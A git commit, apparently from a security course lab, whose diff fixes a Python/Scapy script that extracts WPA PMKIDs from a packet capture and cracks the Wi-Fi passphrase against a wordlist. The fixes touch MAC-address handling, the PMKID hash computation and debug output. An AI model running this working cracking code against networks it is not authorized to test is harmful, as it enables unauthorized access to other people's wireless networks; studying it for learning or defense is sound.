3a488cb2af004d26e3952e84e63927561b2df438
nathan.seville <nathan.seville@hotmail.ch>
2020-04-27 22:05:42 +0200

    found the problem (mac normalization)

--- files/pmkids.py
+++ files/pmkids.py
@@ -11,18 +11,15 @@ import itertools
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap('PMKID_handshake.pcap') 
 
-# Transform mac from string with semicolon to binary string
+# Transform mac from string to binary string
 def normalizeMac(mac):
-    return a2b_hex(mac.replace(":", ""))
+    return mac2str(mac)
 
 # Return an array of SSIDs found in packets. 
 def findSSID(packets, apmac):
     for packet in packets: 
         # The SSID is advertized in Beacons
         if Dot11Beacon in packet and Dot11Elt in packet[Dot11Beacon] and packet.addr2 == apmac:
-            #print(normalizeMac(packet.addr2))
-            #print(apmac)
-
             packet = packet[Dot11Beacon]
             packet = packet[Dot11Elt]
             if packet.ID == 0: # SSID
@@ -34,7 +31,7 @@ def findPMKIDs(packets):
     for packet in packets:
         if packet.haslayer(EAPOL):
             ssid = findSSID(packets, packet.addr2)
-            if ssid != None
+            if ssid != None:
                 PMKIDs[ssid] = (packet[Raw].load[-16:], normalizeMac(packet.addr1), normalizeMac(packet.addr2))
 
     return PMKIDs
@@ -44,7 +41,7 @@ def wordCombinations(words, n):
 
 def PMKID(key, ssid, staMAC, apMAC):
     key = pbkdf2(hashlib.sha1, key, ssid, 4096, 32)
-    return hmac.new(key,str.encode('PMK Name'+str(apMAC)+str(staMAC)),hashlib.sha1).digest()[:16]
+    return hmac.new(key,str.encode('PMK Name')+apMAC+staMAC,hashlib.sha1).digest()[:16]
 
 # Read dictionnary words
 words = [line.rstrip() for line in open('wordlist.txt', 'r')]
@@ -58,17 +55,8 @@ for ssid in APs:
     for i in range(1, maxc+1):
         for key in wordCombinations(words, i):
             pmkid, stamac, apmac = APs[ssid]
-            
-            #print(key)
-            #print(str.encode(''.join(key)))
-            #print(str.encode(ssid))
-            if 'admin123' in ''.join(key):
-                print(ssid)
-                print(''.join(key))
-                print(PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, apmac))
-                print(pmkid)
 
             if pmkid == PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, apmac):
-                print("Found passphrase ", word, " for AP ", ssid)
+                print("Found passphrase ", key, " for AP ", ssid)
                 break
             
